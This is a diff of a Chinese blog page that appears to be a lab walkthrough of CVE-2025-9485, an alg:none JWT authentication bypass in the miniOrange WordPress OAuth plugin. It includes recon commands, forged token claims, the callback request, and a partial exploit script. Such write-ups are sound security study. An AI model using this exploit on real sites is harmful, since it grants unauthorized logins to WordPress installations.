@@ -26,7 +26,7 @@ IP=192.168.205.208
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Oauthless.html">
 <meta property="og:image" content="https://avatars.githubusercontent.com/u/217751621">
 <title>内部_Oauthless</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -50,17 +50,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -93,265 +83,275 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>信息收集</h1>
-<div class="highlight highlight-source-shell"><pre class="notranslate">IP=192.168.205.208</pre></div>
+<pre lang="bash"><code>IP=192.168.205.208
+</code></pre>
 <p>对目标做端口和服务探测。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">nmap -sV -sC -p 22,80,8080 <span class="pl-smi">$IP</span></pre></div>
-<pre class="notranslate"><code class="notranslate">22/tcp   open  ssh        OpenSSH 10.3
+<pre lang="bash"><code>nmap -sV -sC -p 22,80,8080 $IP
+</code></pre>
+<pre><code>22/tcp   open  ssh        OpenSSH 10.3
 80/tcp   open  http       Apache/2.4.67 (Unix)
 8080/tcp open  http-proxy
 </code></pre>
 <p>80 是 Apache，8080 访问后发现是 Keycloak 登录页。SSH 版本太新没什么搞头。</p>
-<p>访问 80 端口是个 WordPress，域名 <code class="notranslate">oauth.dsz</code>，加 hosts。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$IP</span> oauth.dsz<span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> /etc/hosts</pre></div>
-<p>WordPress 登录页有个 "Login with Keycloak" 的 OAuth 按钮，翻源码看看用的什么插件。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">curl -s http://oauth.dsz/wp-login.php <span class="pl-k">|</span> grep miniorange</pre></div>
-<pre class="notranslate"><code class="notranslate">/wp-content/plugins/miniorange-login-with-eve-online-google-facebook/css/login-page.min.css?ver=6.26.11
+<p>访问 80 端口是个 WordPress，域名 <code>oauth.dsz</code>，加 hosts。</p>
+<pre lang="bash"><code>echo &quot;$IP oauth.dsz&quot; &gt;&gt; /etc/hosts
 </code></pre>
-<p>miniOrange OAuth Single Sign On 插件，版本 <code class="notranslate">6.26.11</code>。查了一下 WPScan 漏洞库，这个版本命中 <a title="CVE-2025-9485" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-44hx-mv5h-wj6c/hovercard" href="https://github.com/advisories/GHSA-44hx-mv5h-wj6c">CVE-2025-9485</a>（OAuth Single Sign On &lt; 6.26.13 Authentication Bypass）。</p>
+<p>WordPress 登录页有个 &quot;Login with Keycloak&quot; 的 OAuth 按钮，翻源码看看用的什么插件。</p>
+<pre lang="bash"><code>curl -s http://oauth.dsz/wp-login.php | grep miniorange
+</code></pre>
+<pre><code>/wp-content/plugins/miniorange-login-with-eve-online-google-facebook/css/login-page.min.css?ver=6.26.11
+</code></pre>
+<p>miniOrange OAuth Single Sign On 插件，版本 <code>6.26.11</code>。查了一下 WPScan 漏洞库，这个版本命中 CVE-2025-9485（OAuth Single Sign On &lt; 6.26.13 Authentication Bypass）。</p>
 <p>触发 OAuth 跳转看一下 OIDC 参数。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">curl -sI <span class="pl-s"><span class="pl-pds">"</span>http://oauth.dsz/?option=oauthredirect&amp;app_name=keycloak<span class="pl-pds">"</span></span></pre></div>
-<p>302 跳到 Keycloak 授权端点，从 Location 里提取到：realm 为 <code class="notranslate">wordpress-site</code>，client_id 为 <code class="notranslate">wordpress-client</code>，response_type 为 <code class="notranslate">id_token</code>，response_mode 为 <code class="notranslate">form_post</code>。这些参数构造 payload 时要用到。</p>
-<h1><a title="CVE-2025-9485" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-44hx-mv5h-wj6c/hovercard" href="https://github.com/advisories/GHSA-44hx-mv5h-wj6c">CVE-2025-9485</a> 漏洞利用</h1>
+<pre lang="bash"><code>curl -sI &quot;http://oauth.dsz/?option=oauthredirect&amp;app_name=keycloak&quot;
+</code></pre>
+<p>302 跳到 Keycloak 授权端点，从 Location 里提取到：realm 为 <code>wordpress-site</code>，client_id 为 <code>wordpress-client</code>，response_type 为 <code>id_token</code>，response_mode 为 <code>form_post</code>。这些参数构造 payload 时要用到。</p>
+<h1>CVE-2025-9485 漏洞利用</h1>
 <h2>漏洞原理</h2>
-<p>正常 OIDC 流程中，WordPress 插件收到 Keycloak 返回的 <code class="notranslate">id_token</code> 后，应该用 IdP 的公钥验证 JWT 签名，确认 token 确实由可信的 Keycloak 签发。<a title="CVE-2025-9485" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-44hx-mv5h-wj6c/hovercard" href="https://github.com/advisories/GHSA-44hx-mv5h-wj6c">CVE-2025-9485</a> 的问题在于 miniOrange 插件的 <code class="notranslate">get_resource_owner_from_id_token()</code> 函数没有正确校验 JWT 的 <code class="notranslate">alg</code> 字段。当攻击者把 JWT header 的 <code class="notranslate">alg</code> 设为 <code class="notranslate">none</code> 时，插件跳过签名验证，直接信任 payload 里的用户身份信息并下发 WordPress 登录 Cookie。</p>
+<p>正常 OIDC 流程中，WordPress 插件收到 Keycloak 返回的 <code>id_token</code> 后，应该用 IdP 的公钥验证 JWT 签名，确认 token 确实由可信的 Keycloak 签发。CVE-2025-9485 的问题在于 miniOrange 插件的 <code>get_resource_owner_from_id_token()</code> 函数没有正确校验 JWT 的 <code>alg</code> 字段。当攻击者把 JWT header 的 <code>alg</code> 设为 <code>none</code> 时，插件跳过签名验证，直接信任 payload 里的用户身份信息并下发 WordPress 登录 Cookie。</p>
 <p>公开参考仓库：<a href="https://github.com/jFriedli/CVE-2025-9485">https://github.com/jFriedli/CVE-2025-9485</a></p>
-<p>该仓库给出了通用的理论方向：构造 <code class="notranslate">alg:none</code> 的无签名 JWT，把伪造的 <code class="notranslate">id_token</code> 提交给 WordPress 回调地址，检查响应中是否出现 <code class="notranslate">wordpress_logged_in</code> Cookie。但它是个通用 PoC 草稿，不能直接照搬到当前靶机，原因是：</p>
+<p>该仓库给出了通用的理论方向：构造 <code>alg:none</code> 的无签名 JWT，把伪造的 <code>id_token</code> 提交给 WordPress 回调地址，检查响应中是否出现 <code>wordpress_logged_in</code> Cookie。但它是个通用 PoC 草稿，不能直接照搬到当前靶机，原因是：</p>
 <ul>
-<li>当前靶机使用 <code class="notranslate">response_mode=form_post</code>，<code class="notranslate">id_token</code> 需要以 POST 表单方式提交到回调地址，不是拼在 URL query 里</li>
-<li>必须先触发一次真实的 OAuth 跳转，从中提取插件生成的 <code class="notranslate">state</code> 和 <code class="notranslate">nonce</code>，否则回调会被拒绝</li>
-<li>JWT payload 中的 <code class="notranslate">iss</code> 必须匹配 <code class="notranslate">http://oauth.dsz:8080/realms/wordpress-site</code>，<code class="notranslate">aud</code>/<code class="notranslate">azp</code> 必须匹配 <code class="notranslate">wordpress-client</code></li>
+<li>当前靶机使用 <code>response_mode=form_post</code>，<code>id_token</code> 需要以 POST 表单方式提交到回调地址，不是拼在 URL query 里</li>
+<li>必须先触发一次真实的 OAuth 跳转，从中提取插件生成的 <code>state</code> 和 <code>nonce</code>，否则回调会被拒绝</li>
+<li>JWT payload 中的 <code>iss</code> 必须匹配 <code>http://oauth.dsz:8080/realms/wordpress-site</code>，<code>aud</code>/<code>azp</code> 必须匹配 <code>wordpress-client</code></li>
 </ul>
 <h2>利用流程</h2>
 <p>手工走一遍完整的利用链：</p>
 <ol>
-<li>请求 OAuth 入口，让插件生成会话并拿到 <code class="notranslate">state</code> 和 <code class="notranslate">nonce</code>：</li>
+<li>请求 OAuth 入口，让插件生成会话并拿到 <code>state</code> 和 <code>nonce</code>：</li>
 </ol>
-<div class="highlight highlight-source-shell"><pre class="notranslate">curl -sI <span class="pl-s"><span class="pl-pds">"</span>http://oauth.dsz/?option=oauthredirect&amp;app_name=keycloak<span class="pl-pds">"</span></span></pre></div>
-<p>从 302 Location 里提取 <code class="notranslate">state=xxx&amp;nonce=yyy</code>。</p>
+<pre lang="bash"><code>curl -sI &quot;http://oauth.dsz/?option=oauthredirect&amp;app_name=keycloak&quot;
+</code></pre>
+<p>从 302 Location 里提取 <code>state=xxx&amp;nonce=yyy</code>。</p>
 <ol start="2">
-<li>构造 <code class="notranslate">alg=none</code> 的伪造 JWT。header 部分：</li>
+<li>构造 <code>alg=none</code> 的伪造 JWT。header 部分：</li>
 </ol>
-<div class="highlight highlight-source-json"><pre class="notranslate">{<span class="pl-ent">"typ"</span>:<span class="pl-s"><span class="pl-pds">"</span>JWT<span class="pl-pds">"</span></span>,<span class="pl-ent">"alg"</span>:<span class="pl-s"><span class="pl-pds">"</span>none<span class="pl-pds">"</span></span>}</pre></div>
+<pre lang="json"><code>{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;none&quot;}
+</code></pre>
 <p>payload 部分（关键字段）：</p>
-<div class="highlight highlight-source-json"><pre class="notranslate">{
-  <span class="pl-ent">"iss"</span>: <span class="pl-s"><span class="pl-pds">"</span>http://oauth.dsz:8080/realms/wordpress-site<span class="pl-pds">"</span></span>,
-  <span class="pl-ent">"aud"</span>: <span class="pl-s"><span class="pl-pds">"</span>wordpress-client<span class="pl-pds">"</span></span>,
-  <span class="pl-ent">"azp"</span>: <span class="pl-s"><span class="pl-pds">"</span>wordpress-client<span class="pl-pds">"</span></span>,
-  <span class="pl-ent">"preferred_username"</span>: <span class="pl-s"><span class="pl-pds">"</span>yepian<span class="pl-pds">"</span></span>,
-  <span class="pl-ent">"email"</span>: <span class="pl-s"><span class="pl-pds">"</span>yepian@oauth.dsz<span class="pl-pds">"</span></span>,
-  <span class="pl-ent">"email_verified"</span>: <span class="pl-c1">true</span>,
-  <span class="pl-ent">"nonce"</span>: <span class="pl-s"><span class="pl-pds">"</span>&lt;从步骤1拿到的nonce&gt;<span class="pl-pds">"</span></span>,
-  <span class="pl-ent">"exp"</span>: <span class="pl-ii">&lt;当前时间+3600&gt;</span>
-}</pre></div>
-<p>将 header 和 payload 分别 base64url 编码，用 <code class="notranslate">.</code> 拼接，末尾再加一个 <code class="notranslate">.</code>（空签名），得到最终的 token。</p>
+<pre lang="json"><code>{
+  &quot;iss&quot;: &quot;http://oauth.dsz:8080/realms/wordpress-site&quot;,
+  &quot;aud&quot;: &quot;wordpress-client&quot;,
+  &quot;azp&quot;: &quot;wordpress-client&quot;,
+  &quot;preferred_username&quot;: &quot;yepian&quot;,
+  &quot;email&quot;: &quot;yepian@oauth.dsz&quot;,
+  &quot;email_verified&quot;: true,
+  &quot;nonce&quot;: &quot;&lt;从步骤1拿到的nonce&gt;&quot;,
+  &quot;exp&quot;: &lt;当前时间+3600&gt;
+}
+</code></pre>
+<p>将 header 和 payload 分别 base64url 编码，用 <code>.</code> 拼接，末尾再加一个 <code>.</code>（空签名），得到最终的 token。</p>
 <ol start="3">
 <li>POST 到 WordPress 回调：</li>
 </ol>
-<pre class="notranslate"><code class="notranslate">POST http://oauth.dsz/
+<pre><code>POST http://oauth.dsz/
 Content-Type: application/x-www-form-urlencoded
 
 id_token=&lt;伪造JWT&gt;&amp;state=&lt;步骤1的state&gt;
 </code></pre>
 <ol start="4">
-<li>响应中出现 <code class="notranslate">Set-Cookie: wordpress_logged_in_...</code> 即代表认证绕过成功。</li>
+<li>响应中出现 <code>Set-Cookie: wordpress_logged_in_...</code> 即代表认证绕过成功。</li>
 </ol>
 <h2>自动化利用</h2>
-<p>整个流程我写成了脚本，保存为 <code class="notranslate">exp.py</code>。</p>
-<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-c">#!/usr/bin/env python3</span>
-<span class="pl-k">import</span> <span class="pl-s1">argparse</span>
-<span class="pl-k">import</span> <span class="pl-s1">base64</span>
-<span class="pl-k">import</span> <span class="pl-s1">html</span>
-<span class="pl-k">import</span> <span class="pl-s1">json</span>
-<span class="pl-k">import</span> <span class="pl-s1">random</span>
-<span class="pl-k">import</span> <span class="pl-s1">re</span>
-<span class="pl-k">import</span> <span class="pl-s1">secrets</span>
-<span class="pl-k">import</span> <span class="pl-s1">string</span>
-<span class="pl-k">import</span> <span class="pl-s1">time</span>
-<span class="pl-k">import</span> <span class="pl-s1">urllib</span>.<span class="pl-s1">parse</span>
+<p>整个流程我写成了脚本，保存为 <code>exp.py</code>。</p>
+<pre lang="python"><code>#!/usr/bin/env python3
+import argparse
+import base64
+import html
+import json
+import random
+import re
+import secrets
+import string
+import time
+import urllib.parse
 
-<span class="pl-k">import</span> <span class="pl-s1">requests</span>
-
-
-<span class="pl-c1">R</span> <span class="pl-c1">=</span> <span class="pl-s">"<span class="pl-cce">\033</span>[91m"</span>
-<span class="pl-c1">G</span> <span class="pl-c1">=</span> <span class="pl-s">"<span class="pl-cce">\033</span>[92m"</span>
-<span class="pl-c1">Y</span> <span class="pl-c1">=</span> <span class="pl-s">"<span class="pl-cce">\033</span>[93m"</span>
-<span class="pl-c1">C</span> <span class="pl-c1">=</span> <span class="pl-s">"<span class="pl-cce">\033</span>[96m"</span>
-<span class="pl-c1">B</span> <span class="pl-c1">=</span> <span class="pl-s">"<span class="pl-cce">\033</span>[1m"</span>
-<span class="pl-c1">E</span> <span class="pl-c1">=</span> <span class="pl-s">"<span class="pl-cce">\033</span>[0m"</span>
+import requests
 
 
-<span class="pl-k">def</span> <span class="pl-en">b64url</span>(<span class="pl-s1">d</span>):
-    <span class="pl-k">return</span> <span class="pl-s1">base64</span>.<span class="pl-c1">urlsafe_b64encode</span>(<span class="pl-s1">d</span>).<span class="pl-c1">rstrip</span>(<span class="pl-s">b"="</span>).<span class="pl-c1">decode</span>()
+R = &quot;\033[91m&quot;
+G = &quot;\033[92m&quot;
+Y = &quot;\033[93m&quot;
+C = &quot;\033[96m&quot;
+B = &quot;\033[1m&quot;
+E = &quot;\033[0m&quot;
 
 
-<span class="pl-k">def</span> <span class="pl-en">jwt_none</span>(<span class="pl-s1">claims</span>):
-    <span class="pl-k">return</span> <span class="pl-en">b64url</span>(<span class="pl-s1">json</span>.<span class="pl-c1">dumps</span>({<span class="pl-s">"typ"</span>:<span class="pl-s">"JWT"</span>,<span class="pl-s">"alg"</span>:<span class="pl-s">"none"</span>},<span class="pl-s1">separators</span><span class="pl-c1">=</span>(<span class="pl-s">","</span>,<span class="pl-s">":"</span>)).<span class="pl-c1">encode</span>()) <span class="pl-c1">+</span> <span class="pl-s">"."</span> <span class="pl-c1">+</span> <span class="pl-en">b64url</span>(<span class="pl-s1">json</span>.<span class="pl-c1">dumps</span>(<span class="pl-s1">claims</span>,<span class="pl-s1">separators</span><span class="pl-c1">=</span>(<span class="pl-s">","</span>,<span class="pl-s">":"</span>)).<span class="pl-c1">encode</span>()) <span class="pl-c1">+</span> <span class="pl-s">"."</span>
+def b64url(d):
+    return base64.urlsafe_b64encode(d).rstrip(b&quot;=&quot;).decode()
 
 
-<span class="pl-k">def</span> <span class="pl-en">rand_pw</span>():
-    <span class="pl-s1">a</span> <span class="pl-c1">=</span> <span class="pl-s1">string</span>.<span class="pl-c1">ascii_letters</span> <span class="pl-c1">+</span> <span class="pl-s1">string</span>.<span class="pl-c1">digits</span> <span class="pl-c1">+</span> <span class="pl-s">"!@#$%&amp;*"</span>
-    <span class="pl-k">while</span> <span class="pl-c1">True</span>:
-        <span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-s">""</span>.<span class="pl-c1">join</span>(<span class="pl-s1">secrets</span>.<span class="pl-c1">choice</span>(<span class="pl-s1">a</span>) <span class="pl-k">for</span> <span class="pl-s1">_</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-c1">20</span>))
-        <span class="pl-k">if</span> <span class="pl-en">any</span>(<span class="pl-s1">c</span>.<span class="pl-c1">islower</span>() <span class="pl-k">for</span> <span class="pl-s1">c</span> <span class="pl-c1">in</span> <span class="pl-s1">p</span>) <span class="pl-c1">and</span> <span class="pl-en">any</span>(<span class="pl-s1">c</span>.<span class="pl-c1">isupper</span>() <span class="pl-k">for</span> <span class="pl-s1">c</span> <span class="pl-c1">in</span> <span class="pl-s1">p</span>) <span class="pl-c1">and</span> <span class="pl-en">any</span>(<span class="pl-s1">c</span>.<span class="pl-c1">isdigit</span>() <span class="pl-k">for</span> <span class="pl-s1">c</span> <span class="pl-c1">in</span> <span class="pl-s1">p</span>) <span class="pl-c1">and</span> <span class="pl-en">any</span>(<span class="pl-s1">c</span> <span class="pl-c1">in</span> <span class="pl-s">"!@#$%&amp;*"</span> <span class="pl-k">for</span> <span class="pl-s1">c</span> <span class="pl-c1">in</span> <span class="pl-s1">p</span>):
-            <span class="pl-k">return</span> <span class="pl-s1">p</span>
+def jwt_none(claims):
+    return b64url(json.dumps({&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;none&quot;},separators=(&quot;,&quot;,&quot;:&quot;)).encode()) + &quot;.&quot; + b64url(json.dumps(claims,separators=(&quot;,&quot;,&quot;:&quot;)).encode()) + &quot;.&quot;
 
 
-<span class="pl-k">def</span> <span class="pl-en">parse_url</span>(<span class="pl-s1">raw</span>):
-    <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">raw</span>.<span class="pl-c1">startswith</span>(<span class="pl-s">"http://"</span>) <span class="pl-c1">and</span> <span class="pl-c1">not</span> <span class="pl-s1">raw</span>.<span class="pl-c1">startswith</span>(<span class="pl-s">"https://"</span>):
-        <span class="pl-s1">raw</span> <span class="pl-c1">=</span> <span class="pl-s">"http://"</span> <span class="pl-c1">+</span> <span class="pl-s1">raw</span>
-    <span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-s1">urllib</span>.<span class="pl-c1">parse</span>.<span class="pl-c1">urlparse</span>(<span class="pl-s1">raw</span>)
-    <span class="pl-k">return</span> <span class="pl-s1">p</span>.<span class="pl-c1">scheme</span>, <span class="pl-s1">p</span>.<span class="pl-c1">hostname</span> <span class="pl-c1">or</span> <span class="pl-s">""</span>, <span class="pl-s1">p</span>.<span class="pl-c1">port</span> <span class="pl-c1">or</span> (<span class="pl-c1">443</span> <span class="pl-k">if</span> <span class="pl-s1">p</span>.<span class="pl-c1">scheme</span> <span class="pl-c1">==</span> <span class="pl-s">"https"</span> <span class="pl-k">else</span> <span class="pl-c1">80</span>)
+def rand_pw():
+    a = string.ascii_letters + string.digits + &quot;!@#$%&amp;*&quot;
+    while True:
+        p = &quot;&quot;.join(secrets.choice(a) for _ in range(20))
+        if any(c.islower() for c in p) and any(c.isupper() for c in p) and any(c.isdigit() for c in p) and any(c in &quot;!@#$%&amp;*&quot; for c in p):
+            return p
 
 
-<span class="pl-k">def</span> <span class="pl-en">get_wp_host</span>(<span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>):
-    <span class="pl-k">try</span>:
-        <span class="pl-s1">base</span> <span class="pl-c1">=</span> <span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">scheme</span><span class="pl-kos">}</span></span>://<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">ip</span><span class="pl-kos">}</span></span>"</span> <span class="pl-k">if</span> <span class="pl-s1">port</span> <span class="pl-c1">in</span> (<span class="pl-c1">80</span>, <span class="pl-c1">443</span>) <span class="pl-k">else</span> <span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">scheme</span><span class="pl-kos">}</span></span>://<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">ip</span><span class="pl-kos">}</span></span>:<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">port</span><span class="pl-kos">}</span></span>"</span>
-        <span class="pl-s1">r</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">get</span>(<span class="pl-s1">base</span> <span class="pl-c1">+</span> <span class="pl-s">"/"</span>, <span class="pl-s1">allow_redirects</span><span class="pl-c1">=</span><span class="pl-c1">False</span>, <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">8</span>)
-        <span class="pl-s1">loc</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">headers</span>.<span class="pl-c1">get</span>(<span class="pl-s">"Location"</span>, <span class="pl-s">""</span>)
-        <span class="pl-k">if</span> <span class="pl-s1">loc</span>:
-            <span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-s1">urllib</span>.<span class="pl-c1">parse</span>.<span class="pl-c1">urlparse</span>(<span class="pl-s1">loc</span>)
-            <span class="pl-k">if</span> <span class="pl-s1">p</span>.<span class="pl-c1">hostname</span> <span class="pl-c1">and</span> <span class="pl-s1">p</span>.<span class="pl-c1">hostname</span> <span class="pl-c1">!=</span> <span class="pl-s1">ip</span>:
-                <span class="pl-k">return</span> <span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">p</span>.<span class="pl-c1">hostname</span><span class="pl-kos">}</span></span>:<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">p</span>.<span class="pl-c1">port</span><span class="pl-kos">}</span></span>"</span> <span class="pl-k">if</span> <span class="pl-s1">p</span>.<span class="pl-c1">port</span> <span class="pl-c1">and</span> <span class="pl-s1">p</span>.<span class="pl-c1">port</span> <span class="pl-c1"><span class="pl-c1">not</span> <span class="pl-c1">in</span></span> (<span class="pl-c1">80</span>, <span class="pl-c1">443</span>) <span class="pl-k">else</span> <span class="pl-s1">p</span>.<span class="pl-c1">hostname</span>
-    <span class="pl-k">except</span>:
-        <span class="pl-k">pass</span>
-    <span class="pl-k">return</span> <span class="pl-s1">ip</span> <span class="pl-k">if</span> <span class="pl-s1">port</span> <span class="pl-c1">in</span> (<span class="pl-c1">80</span>, <span class="pl-c1">443</span>) <span class="pl-k">else</span> <span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">ip</span><span class="pl-kos">}</span></span>:<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">port</span><span class="pl-kos">}</span></span>"</span>
+def parse_url(raw):
+    if not raw.startswith(&quot;http://&quot;) and not raw.startswith(&quot;https://&quot;):
+        raw = &quot;http://&quot; + raw
+    p = urllib.parse.urlparse(raw)
+    return p.scheme, p.hostname or &quot;&quot;, p.port or (443 if p.scheme == &quot;https&quot; else 80)
 
 
-<span class="pl-k">def</span> <span class="pl-en">mkurl</span>(<span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>, <span class="pl-s1">path</span><span class="pl-c1">=</span><span class="pl-s">"/"</span>):
-    <span class="pl-k">return</span> (<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">scheme</span><span class="pl-kos">}</span></span>://<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">ip</span><span class="pl-kos">}</span></span>"</span> <span class="pl-k">if</span> <span class="pl-s1">port</span> <span class="pl-c1">in</span> (<span class="pl-c1">80</span>, <span class="pl-c1">443</span>) <span class="pl-k">else</span> <span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">scheme</span><span class="pl-kos">}</span></span>://<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">ip</span><span class="pl-kos">}</span></span>:<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">port</span><span class="pl-kos">}</span></span>"</span>) <span class="pl-c1">+</span> <span class="pl-s1">path</span>
+def get_wp_host(scheme, ip, port):
+    try:
+        base = f&quot;{scheme}://{ip}&quot; if port in (80, 443) else f&quot;{scheme}://{ip}:{port}&quot;
+        r = requests.get(base + &quot;/&quot;, allow_redirects=False, timeout=8)
+        loc = r.headers.get(&quot;Location&quot;, &quot;&quot;)
+        if loc:
+            p = urllib.parse.urlparse(loc)
+            if p.hostname and p.hostname != ip:
+                return f&quot;{p.hostname}:{p.port}&quot; if p.port and p.port not in (80, 443) else p.hostname
+    except:
+        pass
+    return ip if port in (80, 443) else f&quot;{ip}:{port}&quot;
 
 
-<span class="pl-k">def</span> <span class="pl-en">check_vuln</span>(<span class="pl-s1">s</span>, <span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>):
-    <span class="pl-s1">body</span> <span class="pl-c1">=</span> <span class="pl-s1">s</span>.<span class="pl-c1">get</span>(<span class="pl-en">mkurl</span>(<span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>, <span class="pl-s">"/wp-login.php"</span>), <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">10</span>).<span class="pl-c1">text</span>
-    <span class="pl-s1">body</span> <span class="pl-c1">+=</span> <span class="pl-s1">s</span>.<span class="pl-c1">get</span>(<span class="pl-en">mkurl</span>(<span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>, <span class="pl-s">"/"</span>), <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">10</span>).<span class="pl-c1">text</span>
-    <span class="pl-s1">slug</span> <span class="pl-c1">=</span> <span class="pl-s">"miniorange-login-with-eve-online-google-facebook"</span>
-    <span class="pl-k">if</span> <span class="pl-s1">slug</span> <span class="pl-c1"><span class="pl-c1">not</span> <span class="pl-c1">in</span></span> <span class="pl-s1">body</span>:
-        <span class="pl-k">return</span> <span class="pl-c1">None</span>, <span class="pl-c1">None</span>
-    <span class="pl-s1">ver</span> <span class="pl-c1">=</span> <span class="pl-s1">re</span>.<span class="pl-c1">findall</span>(<span class="pl-s1">slug</span> <span class="pl-c1">+</span> <span class="pl-s">r"/[^?]+\?ver=([0-9.]+)"</span>, <span class="pl-s1">body</span>)
-    <span class="pl-s1">version</span> <span class="pl-c1">=</span> <span class="pl-en">max</span>(<span class="pl-s1">ver</span>, <span class="pl-s1">key</span><span class="pl-c1">=</span><span class="pl-k">lambda</span> <span class="pl-s1">v</span>: <span class="pl-en">tuple</span>(<span class="pl-en">int</span>(<span class="pl-s1">x</span>) <span class="pl-k">for</span> <span class="pl-s1">x</span> <span class="pl-c1">in</span> <span class="pl-s1">v</span>.<span class="pl-c1">split</span>(<span class="pl-s">"."</span>))) <span class="pl-k">if</span> <span class="pl-s1">ver</span> <span class="pl-k">else</span> <span class="pl-c1">None</span>
-    <span class="pl-k">if</span> <span class="pl-s1">version</span> <span class="pl-c1">and</span> <span class="pl-en">tuple</span>(<span class="pl-en">int</span>(<span class="pl-s1">x</span>) <span class="pl-k">for</span> <span class="pl-s1">x</span> <span class="pl-c1">in</span> <span class="pl-s1">version</span>.<span class="pl-c1">split</span>(<span class="pl-s">"."</span>)) <span class="pl-c1">&gt;=</span> (<span class="pl-c1">6</span>, <span class="pl-c1">26</span>, <span class="pl-c1">13</span>):
-        <span class="pl-k">return</span> <span class="pl-s1">version</span>, <span class="pl-c1">False</span>
-    <span class="pl-s1">apps</span> <span class="pl-c1">=</span> <span class="pl-en">list</span>(<span class="pl-s1">dict</span>.<span class="pl-c1">fromkeys</span>(<span class="pl-s1">urllib</span>.<span class="pl-c1">parse</span>.<span class="pl-c1">unquote</span>(<span class="pl-s1">m</span>.<span class="pl-c1">group</span>(<span class="pl-c1">1</span>)) <span class="pl-k">for</span> <span class="pl-s1">m</span> <span class="pl-c1">in</span> <span class="pl-s1">re</span>.<span class="pl-c1">finditer</span>(<span class="pl-s">r"[?&amp;]app_name=([^&amp;'\"&lt;&gt;\s]+)"</span>, <span class="pl-s1">body</span>)))
-    <span class="pl-k">for</span> <span class="pl-s1">a</span> <span class="pl-c1">in</span> [<span class="pl-s">"keycloak"</span>, <span class="pl-s">"openid"</span>, <span class="pl-s">"oauth"</span>]:
-        <span class="pl-k">if</span> <span class="pl-s1">a</span> <span class="pl-c1"><span class="pl-c1">not</span> <span class="pl-c1">in</span></span> <span class="pl-s1">apps</span>:
-            <span class="pl-s1">apps</span>.<span class="pl-c1">append</span>(<span class="pl-s1">a</span>)
-    <span class="pl-k">for</span> <span class="pl-s1">app</span> <span class="pl-c1">in</span> <span class="pl-s1">apps</span>:
-        <span class="pl-k">try</span>:
-            <span class="pl-s1">r</span> <span class="pl-c1">=</span> <span class="pl-s1">s</span>.<span class="pl-c1">get</span>(<span class="pl-en">mkurl</span>(<span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>, <span class="pl-s">f"/?option=oauthredirect&amp;app_name=<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">app</span><span class="pl-kos">}</span></span>"</span>), <span class="pl-s1">allow_redirects</span><span class="pl-c1">=</span><span class="pl-c1">False</span>, <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">10</span>)
-        <span class="pl-k">except</span>:
-            <span class="pl-k">continue</span>
